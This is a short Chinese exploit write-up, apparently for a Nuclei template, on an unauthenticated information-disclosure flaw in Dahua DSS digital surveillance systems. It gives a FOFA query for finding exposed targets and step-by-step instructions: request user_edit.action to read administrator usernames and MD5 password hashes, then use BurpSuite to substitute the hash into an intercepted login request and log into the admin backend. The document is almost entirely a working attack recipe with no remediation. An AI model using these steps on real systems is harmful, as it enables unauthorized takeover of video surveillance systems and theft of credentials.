# nuclei-大华DSS数字监控系统-useredit信息泄露漏洞
Published: 9 July 2024

## Description
大华 DSS 数字监控系统 user_edit.action 接囗处存在信息泄露漏洞。未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码等信息，破解密码后可直接登录后台，使系统处于极不安全的状态。
fofa: app.name="Dahua 大华DSS视频管理系统"
## Exploit Process
1. GET <your_ip>/admin/cascade_/user_edit.action?id=1 HTTP/1.1          （id可以换）
2. inspect网页获取md5格式的密码和用户名
3. BurpSuite 打开大华DSS登录界面的网站，填写用户名密码拦截登录的请求，把密码替换成刚才的md5格式的密码
4. 登录成功
